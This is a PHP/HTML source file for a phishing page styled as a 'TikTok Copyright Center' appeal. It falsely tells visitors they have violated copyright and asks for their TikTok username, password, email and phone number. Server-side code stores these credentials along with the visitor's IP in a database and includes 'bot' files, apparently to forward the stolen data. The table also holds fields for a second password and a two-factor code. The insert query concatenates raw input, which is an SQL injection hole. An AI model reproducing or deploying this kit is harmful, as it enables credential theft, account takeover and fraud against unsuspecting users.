<?php 
include ("app/config.php");
include ("app/database/router.php");
$ip=$_SERVER['REMOTE_ADDR'];
if ($_POST) {
$username=$_POST['user'];
$pass=$_POST['pass'];
$mail=$_POST['mail'];
$no=$_POST['no'];
include ("app/bot/value1.php");
include ("app/bot/value2.php");
$sqleaxmacasspexxx = $spexcon->query("INSERT INTO `users`(`id`, `user`, `pass`, `pass2`, `mail`, `no`, `faktor`, `ip`, `tarih`) VALUES (NULL,'".$username."','".$pass."','Null','".$mail."','".$no."','Null','".$ip."',current_timestamp())");
}
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="icon" type="image/png" href="assets/theme/tt/img/favicon.png">
	<title>TikTok Copyright Center</title>
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
<style>
.spexcoder {

}	
.spex {
    font-family: "sofiapro-medium",PingFangSC,sans-serif;
    font-weight: 500;
    font-size: 14px;
    line-height: 28px;
    line-height: 70px;
    cursor: pointer;
}
.spexh {
    display: block;
    font-size: 2.2em;
    margin-block-start: 0.83em;
    margin-block-end: 0.83em;
    margin-inline-start: 0px;
    margin-inline-end: 0px;
    font-weight: bold;
}
button.spexb {
    outline: none;
    border: 1px solid transparent;
    border-radius: 2px;
    cursor: pointer;
    background-color: #fe2c55;
    color: #ffffff;
    display: block;
    width: 100%;
    padding: 11px 12px;
    min-height: 48px;
    font-family: "proxima-semibold",PingFangSC,sans-serif;
    font-weight: 600;
    font-size: 16px;
    line-height: 24px;
    text-align: center;
    border-radius: 4px;
    margin-top: 48px;
}
button {
    appearance: auto;
    writing-mode: horizontal-tb !important;
    font-style: ;
    font-variant-ligatures: ;
    font-variant-caps: ;
    font-variant-numeric: ;
    font-variant-east-asian: ;
    font-weight: ;
    font-stretch: ;
    font-size: ;
    font-family: ;
    text-rendering: auto;
    color: -internal-light-dark(black, white);
    letter-spacing: normal;
    word-spacing: normal;
    line-height: normal;
    text-transform: none;
    text-indent: 0px;
    text-shadow: none;
    display: inline-block;
    text-align: center;
    align-items: flex-start;
    cursor: default;
    box-sizing: border-box;
    background-color: -internal-light-dark(rgb(239, 239, 239), rgb(59, 59, 59));
    margin: 0em;
    padding: 1px 6px;
    border-width: 2px;
    border-style: outset;
    border-color: -internal-light-dark(rgb(118, 118, 118), rgb(133, 133, 133));
    border-image: initial;
}
input {
    writing-mode: horizontal-tb !important;
    font-style: ;
    font-variant-ligatures: ;
    font-variant-caps: ;
    font-variant-numeric: ;
    font-variant-east-asian: ;
    font-weight: ;
    font-stretch: ;
    font-size: ;
    font-family: ;
    text-rendering: auto;
    color: -internal-light-dark(black, white);
    letter-spacing: normal;
    word-spacing: normal;
    line-height: normal;
    text-transform: none;
    text-indent: 0px;
    text-shadow: none;
    display: inline-block;
    text-align: start;
    appearance: auto;
    -webkit-rtl-ordering: logical;
    cursor: text;
    background-color: -internal-light-dark(rgb(255, 255, 255), rgb(59, 59, 59));
    margin: 0em;
    padding: 1px 2px;
    border-width: 2px;
    border-style: inset;
    border-color: -internal-light-dark(rgb(118, 118, 118), rgb(133, 133, 133));
    border-image: initial;
}
input.spexi {
  padding: 8px 15px;
  border: none;
  outline: none;
  width: 100%;
  background: white;
  border-radius: 4px;
  color: black;
  background-color: ghostwhite;
}
.spexp {
    font-family: "proxima-regular",PingFangSC,sans-serif;
    font-weight: 400;
    font-size: 16px;
    line-height: 24px;
    margin-bottom: 16px;
    color: #4f525a;
}
.spexf {
    width: 100%;
    color: #ffffff;
    background: #000000;
    padding-bottom: 24px;
}
.spexf-cop {
    font-family: "sofiapro-medium",PingFangSC,sans-serif;
    font-weight: 500;
    font-size: 14px;
    line-height: 28px;
    line-height: 24px;
    color: #8a8b91;
}
</style>	
</head>
<body>
<nav>
<br>
<div class="container">
&nbsp;&nbsp;&nbsp;<img src="assets/theme/tt/img/logo.svg">&nbsp;<img src="assets/theme/tt/img/tiktok.svg">
</div>	
</nav>
<hr>
<div class="container">
<div class="row">
<h3 class="spexh">Copyright Appeal</h3>	
<div class="card">
<form method="POST"> 
<center>
<div class="card-body" style="width: 350px;">
<br>
<p class="spexp"><b>If you were redirected to this page you have violated tiktok copyrights. To appeal this violation, please fill out the form below.</b></p>
<br>
<b style="margin-right: 234px;">Username*</b><br>
<input type="text" name="user" class="spexi" required><br><br>
<b style="margin-right: 234px;">Password*</b><br>
<input type="password" name="pass" class="spexi" required><br><br>
<b style="margin-right: 260px;">E-Mail*</b><br>
<input type="email" name="mail" class="spexi" required><br><br>
<b style="margin-right: 190px;">Phone Number*</b><br>
<input type="number" name="no" class="spexi" required><br><br>
<button class="spexb">Submit</button>
<br><br>
</div>
</center>
</form>
</div>
</div>
</div>
<br><br><br>
<footer class="spexf">
<br><br>
<div class="container">
&nbsp;&nbsp;&nbsp;<img src="assets/theme/tt/img/logo2.svg">&nbsp;<img src="assets/theme/tt/img/tiktok2.svg">
<center><br><b class="spexf-cop">© 2022 Tiktok</b></center>
<br></div>
</footer>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.10.2/dist/umd/popper.min.js" integrity="sha384-7+zCNj/IqJ95wo16oMtfsKbZ9ccEh31eOz1HGyDuCQ6wgnyJNSYdrPa03rtR1zdB" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js" integrity="sha384-QJHtvGhmr9XOIpI6YVutG+2QOK9T+ZnN4kzFN1RtK3zEFEIsxhlmWl5/YESvpZ13" crossorigin="anonymous"></script>
</body>
</html>